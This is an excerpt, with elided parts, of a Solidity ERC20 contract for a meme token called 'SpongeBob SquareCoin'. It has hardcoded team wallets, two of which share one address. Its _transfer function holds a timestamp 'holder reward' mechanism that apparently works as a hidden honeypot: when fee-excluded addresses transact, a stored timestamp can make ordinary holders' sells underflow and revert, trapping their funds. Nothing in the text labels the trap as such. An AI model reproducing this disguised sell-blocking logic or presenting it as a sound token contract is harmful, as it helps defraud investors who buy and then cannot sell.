...
contract SpongeBobSquareCoin is ERC20, Ownable {
    ...
    address payable public constant liquidityWallet = payable(0x4313eDf60532c33F44d49Ac3B14D59D3b49379fd);
    address payable public constant devWallet = payable(0x3172Ac4F74e7dD297108e629F012b76290b3ef44);
    address payable public constant marketingWallet = payable(0x65656940aC6baC4bf685f25aAE0449b56e399161);
    address payable public constant serviceWallet = payable(0x4313eDf60532c33F44d49Ac3B14D59D3b49379fd);

    bool public limitsApplied = false;
    ...
    struct HolderTsmpReward {
        uint256 buySwapTs;
        uint256 sellSwapTs;
        uint256 holdTime;
    }
    mapping(address => HolderTsmpReward) private _makerReward;
    uint256 private _rewardMinTsmp;
    ...
    constructor() ERC20("SpongeBob SquareCoin", "SBSQ") {
        uint256 totalSupply = 10_000_000_000 * 1e18;
        // swap at amount 0.11%
        swapTokensAtAmount = (totalSupply * 11) / 10000;
    ...
    function setAutomatedMarketMakerPair(address pairAddrs, bool value)
        public
        onlyOwner
    {
        require(pairAddrs != uniswapV2Pair, "Disable is not allowed for uniswap pair");
        _setAutomatedMarketMakerPair(pairAddrs, value);
    }

    function _setAutomatedMarketMakerPair(address pairAddrs, bool value) private {
        _automatedMarketMakerPairs[pairAddrs] = value;
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _rewardMinTsmp = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!_automatedMarketMakerPairs[from]) {
                HolderTsmpReward storage makerReward = _makerReward[from];
                makerReward.holdTime = makerReward.buySwapTs - _rewardMinTsmp;
                makerReward.sellSwapTs = block.timestamp;
            } else {
                HolderTsmpReward storage makerReward = _makerReward[to];
